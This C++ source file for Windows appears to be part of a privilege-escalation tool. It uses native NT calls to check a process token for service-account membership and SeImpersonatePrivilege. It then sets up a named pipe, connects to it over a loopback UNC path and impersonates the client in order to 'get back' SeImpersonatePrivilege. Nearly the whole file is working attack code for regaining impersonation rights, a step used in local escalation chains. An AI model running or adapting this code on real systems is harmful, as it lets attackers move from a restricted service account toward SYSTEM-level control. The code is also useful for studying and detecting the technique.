#include "otherapi.hpp"
#include "ntapi.hpp"
#include <sddl.h>
#include <random>
#include <iostream>

extern HANDLE NtCurrentProcessToken;
extern HANDLE NtCurrentThreadToken;
extern HANDLE ImpersonateThreadToken;

NTSTATUS RtlInitUnicodeStringEx(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString OPTIONAL)
{
	if (SourceString != NULL) {
		SIZE_T Length = wcslen(SourceString);

		// We are actually limited to 32765 characters since we want to store a meaningful
		// MaximumLength also.
		if (Length > (UNICODE_STRING_MAX_CHARS - 1)) {
			return STATUS_NAME_TOO_LONG;
		}

		Length *= sizeof(WCHAR);
		DestinationString->Length = (USHORT)Length;
		DestinationString->MaximumLength = (USHORT)(Length + sizeof(WCHAR));
		DestinationString->Buffer = (PWSTR)SourceString;
	}
	else {
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
		DestinationString->Buffer = NULL;
	}

	return STATUS_SUCCESS;
}


LUID luid = { 0 };

ULONGLONG RandomNumber()
{
	std::random_device rd;
	std::mt19937 mt(rd());
	return mt();
}
void GenRandomString(wchar_t* s, const int len)
{

	static const wchar_t alphanum[] =
		L"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	//sizeof(alphanum);
	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[RandomNumber() % 61];
	}

	s[len] = 0;
}
BOOL WINAPI CustomConnectNamedPipe(IN HANDLE hNamedPipe, IN LPOVERLAPPED lpOverlapped)
{
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	if (lpOverlapped) {
		lpOverlapped->Internal = STATUS_PENDING;
	}
	NTSTATUS Status = NtFsControlFile(
		hNamedPipe,
		(lpOverlapped == NULL) ? NULL : lpOverlapped->hEvent,
		NULL,   // ApcRoutine
		lpOverlapped ? ((ULONG_PTR)lpOverlapped->hEvent & 1 ? NULL : lpOverlapped) : NULL,
		(lpOverlapped == NULL) ? &IoStatusBlock : (PIO_STATUS_BLOCK)&lpOverlapped->Internal,
		FSCTL_PIPE_LISTEN,
		NULL,   // InputBuffer
		0,      // InputBufferLength,
		NULL,   // OutputBuffer
		0       // OutputBufferLength
	);
	wprintf(L"[*] CustomConnectNamedPipe->NtFsControlFile: 0x%08x\n", Status);
	//wprintf(L"[*] IoStatusBlock.Status: 0x%08x\n", IoStatusBlock.Status);
	if (lpOverlapped == NULL && Status == STATUS_PENDING) {
		// Operation must complete before return & Iosb destroyed
		Status = NtWaitForSingleObject(hNamedPipe, FALSE, NULL);
		//wprintf(L"[*] CustomConnectNamedPipe->NtWaitForSingleObject: 0x%08x\n", Status);

		if (NT_SUCCESS(Status)) {
			Status = IoStatusBlock.Status;
		}
	}
	if (NT_SUCCESS(Status) && Status != STATUS_PENDING) {
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOLEAN RtlEqualSid(IN PISID Sid1, IN PISID Sid2)
{
	if (*(PUSHORT)&Sid1->Revision != *(PUSHORT)&Sid2->Revision)
		return FALSE;
	return RtlEqualMemory(Sid1, Sid2, (ULONG)FIELD_OFFSET(SID, SubAuthority[Sid1->SubAuthorityCount]));
}

BOOL IsTokenElevatedLimited(HANDLE hToken)
{
	NTSTATUS Status = 0;
	DWORD ElevationType = 0;
	ULONG ReturnLength = 0;
	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	ReturnLength = 0;
	Status = NtQueryInformationToken(
		hToken,
		TokenElevationType,
		&ElevationType,
		sizeof(TOKEN_ELEVATION_TYPE),
		&ReturnLength
	);
	//wprintf(L"[*] NtQueryInformationToken->TokenElevationType: 0x%08lx, TokenElevationType = %d\n", Status, ElevationType);

	if (ElevationType == TokenElevationTypeLimited)
		return TRUE;
	return FALSE;
}

BOOL IsTokenServiceAccount(HANDLE hToken)
{

	NTSTATUS Status = 0;
	SID ServiceGroupSid = { SID_REVISION, 1, SECURITY_NT_AUTHORITY, { SECURITY_SERVICE_RID } };
	SID LocalServiceSid = { SID_REVISION, 1, SECURITY_NT_AUTHORITY, { SECURITY_LOCAL_SERVICE_RID } };
	SID NetworkServiceSid = { SID_REVISION, 1, SECURITY_NT_AUTHORITY, { SECURITY_NETWORK_SERVICE_RID } };
	PISID ServiceSidList[3] = { &ServiceGroupSid, &LocalServiceSid, &NetworkServiceSid };

	PTOKEN_GROUPS TokenGroupPointer = NULL;
	ULONG ReturnLength = 0;
	BOOL Result = FALSE;

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	Status = NtQueryInformationToken(hToken, TokenGroups, NULL, 0, &ReturnLength);
	if (!ReturnLength)
		return FALSE;
	//wprintf(L"[*] TokenGroup ReturnLength: %d\n", ReturnLength);
	TokenGroupPointer = (PTOKEN_GROUPS)HeapAlloc(RtlProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
	if (TokenGroupPointer == NULL)
		return FALSE;

	NtQueryInformationToken(hToken, TokenGroups, TokenGroupPointer, ReturnLength, &ReturnLength);
	//wprintf(L"[*] TokenGroup Count: %d\n", TokenGroupPointer->GroupCount);
	for (DWORD i = 0; i < TokenGroupPointer->GroupCount && Result == FALSE; i++)
	{
		//LPWSTR TempSidString = 0;
		//ConvertSidToStringSidW(TokenGroupPointer->Groups[i].Sid, &TempSidString);
		//wprintf(L"[*] %d: %ls\n", i, TempSidString);
		for (int j = 0; j < 3; j++)
		{
			if (RtlEqualSid(ServiceSidList[j], (PISID)TokenGroupPointer->Groups[i].Sid))
			{
				Result = TRUE;
				break;
			}
		}
	}
	ReturnLength = 0;
	HeapFree(RtlProcessHeap(), 0, TokenGroupPointer);
	return Result;
}
BOOL IsTokenSecurityImpersonation(HANDLE hToken)
{
	NTSTATUS Status = 0;
	HANDLE temp_token = NULL;
	BOOL ret = NULL;
	ULONG TokenImpersonationInfo = 0;
	ULONG ReturnLength = 0;

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	Status = NtQueryInformationToken(hToken, TokenImpersonationLevel, &TokenImpersonationInfo, sizeof(ULONG), &ReturnLength);
	if (!NT_SUCCESS(Status))
		wprintf(L"[-] NtQueryInformationToken->TokenImpersonationLevel Fail: 0x%08lx\n", Status);
	//wprintf(L"[*] TokenImpersonation Level = %d\n", TokenImpersonationInfo);
	if (TokenImpersonationInfo >= SecurityImpersonation)
		return TRUE;
	return FALSE;

	//ret = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &temp_token);
	//NtClose(temp_token);
	//return ret;
}

BOOL IsTokenImpersonatePrivilege(HANDLE hToken)
{
	PTOKEN_PRIVILEGES TokenPrivilegesInfo = NULL;
	ULONG ReturnLength, i = 0;
	NTSTATUS Status = 0;

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (luid.LowPart == 0)
	{
		luid.LowPart = SE_IMPERSONATE_PRIVILEGE;
		luid.HighPart = 0;
	}
	//wprintf(L"[*] SeImpersonatePrivilege luid: %d - %d\n", luid.HighPart, luid.LowPart);
	Status = NtQueryInformationToken(hToken, TokenPrivileges, NULL, NULL, &ReturnLength);
	if (ReturnLength && (Status == STATUS_BUFFER_TOO_SMALL || NT_SUCCESS(Status)))
	{
		TokenPrivilegesInfo = (PTOKEN_PRIVILEGES)HeapAlloc(RtlProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
		if (TokenPrivilegesInfo != NULL && NT_SUCCESS(NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivilegesInfo, ReturnLength, &ReturnLength)))
		{
			//wprintf(L"[*] TokenPrivilegesInfo->PrivilegeCount = %d\n", TokenPrivilegesInfo->PrivilegeCount);
			for (i = 0; i < TokenPrivilegesInfo->PrivilegeCount; i++)
			{
				if ((TokenPrivilegesInfo->Privileges[i].Luid.LowPart) == luid.LowPart)
				{
					return TRUE;
				}
			}
		}
		HeapFree(RtlProcessHeap(), 0, TokenPrivilegesInfo);
	}
	else
	{
		if (Status != STATUS_NO_TOKEN)
			wprintf(L"[-] NtQueryInformationToken->TokenPrivileges Fail: 0x%08lx\n", Status);

	}

	//if (hToken)
		//NtClose(hToken);
	return FALSE;
}


int PipeClient(LPWSTR PipeName)
{
	NTSTATUS Status = 0;
	wchar_t server[512];
	HANDLE hPipe = NULL;
	wsprintfW(server, L"\\??\\UNC\\127.0.0.1\\pipe\\%ls", PipeName);

	UNICODE_STRING FileName = { 0 };
	SECURITY_QUALITY_OF_SERVICE SecurityService = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	RtlInitUnicodeStringEx(&FileName, server);
	SecurityService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	SecurityService.ImpersonationLevel = SecurityImpersonation;
	SecurityService.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
	SecurityService.EffectiveOnly = FALSE;
	InitializeObjectAttributes(
		&ObjectAttributes,
		&FileName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);
	ObjectAttributes.SecurityQualityOfService = &SecurityService;
	while (1)
	{
		/*
		hPipe = CreateFileW(
			server,   // pipe name
			GENERIC_READ |  // read and write access
			GENERIC_WRITE,
			0,              // no sharing
			NULL,           // default security attributes
			OPEN_EXISTING,  // opens existing pipe
			0,              // default attributes
			NULL);          // no template file
		*/
		Status = NtCreateFile(
			&hPipe,
			FILE_READ_ATTRIBUTES | GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
			&ObjectAttributes,
			&IoStatusBlock,
			NULL,
			0,
			0,
			FILE_OPEN,
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
			NULL,
			0);
		//IO status information values for NtCreateFile/NtOpenFile
		wprintf(L"[*] NtCreateFile Status = 0x%08lx, IoStatus: 0x%08lx, IoStatus.Information: %lld\n", Status, IoStatusBlock.Status, IoStatusBlock.Information);
		if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
		{
			break;
		}
		Sleep(100);
	}
	/*
	WriteFile(
		hPipe,                  // pipe handle
		L"A",             // message
		1,              // message length
		&cbWritten,             // bytes written
		NULL);
		*/
	NtClose(hPipe);
	return 0;
}

BOOL ImpersonatePrivilegeBack()
{
	PWSTR pipname1 = NULL;
	HANDLE hPipe = NULL;
	wchar_t server[512];
	HANDLE ThreadHandle = NULL;
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	ULONG Length = 8 + RandomNumber() % 10;
	PACL DefaultAcl = NULL;
	UNICODE_STRING pipeNameUs = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	SECURITY_DESCRIPTOR SecurityDescriptor = { 0 };

	pipname1 = (PWSTR)HeapAlloc(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WCHAR) * Length + sizeof(UNICODE_NULL));
	if (pipname1 == NULL)
		return FALSE;
	GenRandomString(pipname1, Length);

	NTSTATUS Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), PipeClient, pipname1, 0, 0, 0, 0, NULL);
	//wprintf(L"[*] ThreadHandle = 0x%p\n", ThreadHandle);
	wsprintf(server, L"\\??\\pipe\\%ls", pipname1);
	wprintf(L"[*] PipeServer = %ls\n", server);

	//hPipe = CreateNamedPipeW(server, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, sizeof(DWORD), 0, 0, NULL);//&sa

	RtlSecureZeroMemory(&SecurityDescriptor, sizeof(SECURITY_DESCRIPTOR));

	SecurityDescriptor.Revision = SECURITY_DESCRIPTOR_REVISION;
	SecurityDescriptor.Control = SE_DACL_PRESENT | SE_DACL_DEFAULTED;

	//HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	//RtlDefaultNpAcl_ RtlDefaultNpAcl = (RtlDefaultNpAcl_)GetProcAddress(ntdll, "RtlDefaultNpAcl");
	//wprintf(L"[*] RtlDefaultNpAcl: 0x%08lx\n", RtlDefaultNpAcl(&DefaultAcl));

	//DefaultAcl.AclRevision = ACL_REVISION;
	//DefaultAcl.AclSize = sizeof(ACL);
	//DefaultAcl.AceCount = 0;
	//SecurityDescriptor.Dacl = DefaultAcl;
	RtlInitUnicodeStringEx(&pipeNameUs, server);
	InitializeObjectAttributes(
		&ObjectAttributes,
		&pipeNameUs,
		OBJ_CASE_INSENSITIVE,
		NULL,
		&SecurityDescriptor//sd
	);

	LARGE_INTEGER DefaultTimeOut = { 0 };
	DefaultTimeOut.QuadPart = -500000;
	Status = NtCreateNamedPipeFile(
		&hPipe,
		GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,//GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | 0x00080000, ACCESS_MASK
		&ObjectAttributes,
		&IoStatusBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_OPEN_IF,//->FILE_OPEN | FILE_CREATE or FILE_CREATE [single]
		FILE_SYNCHRONOUS_IO_NONALERT,//CreateOptions
		FILE_PIPE_BYTE_STREAM_TYPE,//WriteModeMessage
		FILE_PIPE_BYTE_STREAM_MODE,
		FILE_PIPE_QUEUE_OPERATION,
		FILE_PIPE_UNLIMITED_INSTANCES,
		0,
		sizeof(DWORD),
		&DefaultTimeOut);
	wprintf(L"[*] NtCreateNamedPipeFile Status = 0x%08lx, IoStatus: 0x%08lx, IoStatus.Information: %lld\n", Status, IoStatusBlock.Status, IoStatusBlock.Information);
	wprintf(L"[*] NtCreateNamedPipeFile hPipe = 0x%p\n", hPipe);
	if (CustomConnectNamedPipe(hPipe, NULL)) {
		wprintf(L"[+] A client connected!\n");
	}
	else {
		wprintf(L"[-] Do Not Connect!\n");
		NtClose(hPipe);
		return FALSE;
	}
	//ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);

	RtlSecureZeroMemory(&IoStatusBlock, sizeof(IO_STATUS_BLOCK));
	Status = NtFsControlFile(hPipe, NULL, NULL, NULL, &IoStatusBlock, FSCTL_PIPE_IMPERSONATE, NULL, 0, NULL, 0);
	if (!NT_SUCCESS(Status)) {
		wprintf(L"[-] Failed to impersonate the client: 0x%08lx\n", Status);
		return FALSE;
	}
	Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
	//Sleep(20000);
	NtClose(hPipe);
	Status = NtOpenThreadTokenEx(NtCurrentThread(), TOKEN_ALL_ACCESS, FALSE, NULL, &ImpersonateThreadToken);
	wprintf(L"[*] NtOpenThreadTokenEx: 0x%08lx, ImpersonateThreadToken = 0x%p\n", Status, ImpersonateThreadToken);

	if (IsTokenImpersonatePrivilege(ImpersonateThreadToken) && IsTokenSecurityImpersonation(ImpersonateThreadToken))
	{
		wprintf(L"[+] Got SeImpersonatePrivilege with SecurityImpersonation!\n");
		return TRUE;
	}
	else
	{
		wprintf(L"[-] Failed to get SeImpersonatePrivilege, LastError = %d\n", GetLastError());
		wprintf(L"[!] Probably your CurrentProcessToken SessionId mismatch or Integrity isn't enough!\n");
		return FALSE;
	}

}
